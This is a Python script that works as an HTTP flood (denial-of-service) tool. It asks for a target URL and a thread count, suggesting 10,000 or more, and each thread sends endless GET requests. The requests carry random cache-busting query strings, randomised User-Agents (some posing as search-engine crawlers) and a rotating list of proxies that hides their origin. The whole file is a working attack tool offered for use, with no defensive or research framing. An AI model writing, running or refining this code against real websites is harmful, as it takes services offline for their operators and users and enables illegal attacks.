import threading
import requests
import random
import string
import time

def generate_random_data():
    """Generate random data to append to the URL to create unique requests."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(20))

def generate_dynamic_user_agent():
    """Generate a random User-Agent string to simulate various browsers and devices."""
    browsers = ["Chrome", "Firefox", "Safari", "Edge", "Opera"]
    versions = ["91.0", "92.0", "93.0", "94.0", "95.0"]
    os_systems = ["Windows NT 10.0", "Macintosh; Intel Mac OS X 10.15", "X11; Linux x86_64", "Android 11"]
    browser = random.choice(browsers)
    version = random.choice(versions)
    os_system = random.choice(os_systems)
    return f"Mozilla/5.0 ({os_system}; {browser} {version}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{version} Safari/537.36"

def get_proxy():
    """Fetch a random proxy from a predefined list."""
    proxies = [
        "http://10.10.1.10:3128",
        "http://45.152.188.212:3128",
        "http://213.230.71.175:3128",
        "https://189.240.60.163:9090",
        "https://45.152.188.241:3128",
        "https://82.115.13.232:80",
        "https://51.255.20.138:80",
        "https://10.10.1.11:1080",
        "http://10.10.1.10:1080",
        # Add more proxies here as needed
    ]
    return random.choice(proxies)

def attack(url):
    """Perform HTTP/HTTPS GET requests to flood the target URL."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.3 Safari/602.3.12",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
        # Additional User-Agent Strings...
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.70",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:14.1) Gecko/20100101 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:14.0) Gecko/20100101 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:13.0) Gecko/20100101 Safari/537.36",
        "Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
        "Mozilla/5.0 (Android 11; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
        "Mozilla/5.0 (Android 12; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; +http://www.yahoo.com/help/us/ysearch/slurp)",
    ]

    while True:
        try:
            full_url = f"{url}?{generate_random_data()}"
            proxy = get_proxy()
            proxies = {"http": proxy, "https": proxy}
            headers = {"User-Agent": generate_dynamic_user_agent()}
            response = requests.get(full_url, headers=headers, proxies=proxies)
            print(f"Attacked {full_url} with response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def main():
    """Main function to set up the attack."""
    url = input("Enter the target URL (include http:// or https://): ")
    num_threads = int(input("Enter the number of threads (suggest 10000+): "))
    delay = float(input("Enter the delay between requests in seconds (suggest 0.001 or less): "))

    threads = []

    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(url,))
        thread.daemon = True
        threads.append(thread)
        time.sleep(delay)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
